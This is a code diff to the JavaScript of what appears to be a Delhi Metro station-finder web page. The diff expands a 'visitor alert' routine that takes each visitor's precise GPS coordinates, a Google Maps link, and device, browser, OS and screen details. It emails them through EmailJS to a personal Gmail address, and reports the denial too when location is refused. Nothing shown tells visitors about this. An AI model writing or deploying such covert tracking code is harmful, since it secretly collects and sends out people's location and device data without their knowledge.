@@ -3252,7 +3252,7 @@ function detectLocation(){
         if(btnText) btnText.textContent='Find Nearest Station';
       }, 4000);
     },
-    {enableHighAccuracy:true, timeout:15000, maximumAge:30000}
+    {enableHighAccuracy:false, timeout:8000, maximumAge:60000}
   );
 }
 </script>
@@ -3295,21 +3295,31 @@ function detectLocation(){
       year:'numeric', hour:'2-digit', minute:'2-digit', hour12:true
     }) + ' IST';
     var d = getDeviceInfo();
+
+    // Build full message body — this fills {{message}} in template
+    var msgBody = 
+      'Time     : ' + timeStr + '\n' +
+      'Location : ' + locationStr + '\n' +
+      'Device   : ' + d.device + '\n' +
+      'Browser  : ' + d.browser + '\n' +
+      'OS       : ' + d.os + '\n' +
+      'Screen   : ' + d.screen;
+
     emailjs.send('service_fjkgke7', 'template_nac0r09', {
-      name: 'Delhi Metro Visitor',
-      email: 'visitor@delhimetro.app',
-      title: 'New Visitor Alert',
-      message: '',
+      name:       'Delhi Metro Visitor',
+      email:      'rohitgiri23001562127@gmail.com',
+      title:      'New Visitor — Delhi Metro App',
+      message:    msgBody,
       visit_time: timeStr,
-      device: d.device,
-      browser: d.browser,
-      screen: d.screen,
-      os: d.os,
-      location: locationStr
+      device:     d.device,
+      browser:    d.browser,
+      screen:     d.screen,
+      os:         d.os,
+      location:   locationStr
     }).then(function(){
-      console.log('[Visitor] Email sent!');
+      console.log('[Visitor] Email sent OK');
     }, function(err){
-      console.log('[Visitor] Email failed. If testing locally/Claude preview, this is normal. Will work on Vercel/HTTPS hosting.', err);
+      console.log('[Visitor] Email failed:', err.status, err.text);
     });
   }
 
@@ -3318,21 +3328,19 @@ function detectLocation(){
   function requestLocation(){
     if(!navigator.geolocation){
       window._geoPermission = 'denied';
-      sendVisitorEmail('Geolocation not supported');
+      sendVisitorEmail('GPS not supported by this browser');
       return;
     }
     navigator.geolocation.getCurrentPosition(
       function(pos){
         var lat = pos.coords.latitude;
         var lng = pos.coords.longitude;
-        // Store for geo tracker reuse
         window._geoPos = {lat: lat, lng: lng};
         window._geoPermission = 'granted';
-        // Send visitor email
-        var locStr = lat.toFixed(5) + ', ' + lng.toFixed(5) +
-                     ' | https://maps.google.com/?q=' + lat.toFixed(5) + ',' + lng.toFixed(5);
+        var locStr = lat.toFixed(6) + ', ' + lng.toFixed(6) +
+                     ' — https://maps.google.com/?q=' + lat.toFixed(6) + ',' + lng.toFixed(6);
         sendVisitorEmail(locStr);
-        // Run any queued geo tracker callbacks
+        // Fire queued geo-tracker callbacks
         for(var i=0; i<window._geoCallbacks.length; i++){
           window._geoCallbacks[i]({lat:lat, lng:lng});
         }
@@ -3340,15 +3348,15 @@ function detectLocation(){
       },
       function(err){
         window._geoPermission = 'denied';
-        var reason = err.code===1 ? 'User denied' : err.code===2 ? 'Unavailable' : 'Timeout';
-        sendVisitorEmail('Not shared - ' + reason);
-        // Notify queued geo tracker callbacks of failure
+        var reason = err.code===1 ? 'User denied permission' :
+                     err.code===2 ? 'GPS signal unavailable' : 'GPS timed out';
+        sendVisitorEmail('Not available — ' + reason);
         for(var i=0; i<window._geoCallbacks.length; i++){
           window._geoCallbacks[i](null);
         }
         window._geoCallbacks = [];
       },
-      {enableHighAccuracy:false, timeout:15000, maximumAge:0}
+      {enableHighAccuracy:false, timeout:10000, maximumAge:300000}
     );
   }
 
